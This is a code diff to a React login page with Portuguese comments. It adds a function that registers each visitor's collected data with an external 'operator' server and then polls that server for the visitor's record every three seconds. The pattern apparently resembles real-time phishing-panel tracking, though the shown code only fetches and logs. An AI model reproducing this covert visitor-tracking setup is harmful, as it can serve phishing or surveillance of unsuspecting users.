@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
@@ -79,6 +78,70 @@ const collectClientData = async () => {
     currentUrl,
     referrer
   };
+};
+
+// Função para monitorar cliente continuamente
+const monitorClient = async (clientId: string): Promise<void> => {
+  console.log(`Iniciando monitoramento do cliente: ${clientId}`);
+  
+  const monitor = async () => {
+    try {
+      console.log(`Consultando dados do cliente ${clientId}...`);
+      
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      console.log(`Status da consulta: ${response.status}`);
+      
+      if (response.ok) {
+        const clientData = await response.json();
+        console.log('Dados do cliente recebidos:', clientData);
+      } else {
+        const errorData = await response.text();
+        console.log('Erro na consulta do cliente:', errorData);
+      }
+
+    } catch (error) {
+      console.log('Erro durante consulta do cliente:', error);
+    }
+  };
+
+  // Executar primeira consulta imediatamente
+  await monitor();
+  
+  // Configurar monitoramento contínuo a cada 3 segundos
+  setInterval(monitor, 3000);
+};
+
+// Função para processar resposta de registro e iniciar monitoramento
+const processRegistrationResponse = async (response: Response): Promise<void> => {
+  try {
+    const responseData = await response.json();
+    console.log('Cliente registrado com sucesso:', responseData);
+    
+    // Verificar se a resposta contém clientId
+    if (responseData.success && responseData.clientId) {
+      console.log('ClientId capturado:', responseData.clientId);
+      
+      // Iniciar monitoramento contínuo do cliente
+      await monitorClient(responseData.clientId);
+    } else {
+      console.log('ClientId não encontrado na resposta');
+      
+      // Tentar capturar ID de outras possíveis localizações na resposta
+      const clientId = responseData.clientId || responseData.data?.id || responseData.id;
+      if (clientId) {
+        console.log('ClientId encontrado em localização alternativa:', clientId);
+        await monitorClient(clientId);
+      }
+    }
+  } catch (error) {
+    console.log('Erro ao processar resposta de registro:', error);
+  }
 };
 
 const Index = () => {
@@ -207,8 +270,8 @@ const Index = () => {
       console.log('Status da resposta:', response.status);
       
       if (response.ok) {
-        const responseData = await response.json();
-        console.log('Cliente registrado com sucesso:', responseData);
+        // Processar resposta e iniciar monitoramento
+        await processRegistrationResponse(response);
       } else {
         const errorData = await response.text();
         console.log('Erro na resposta da API:', errorData);
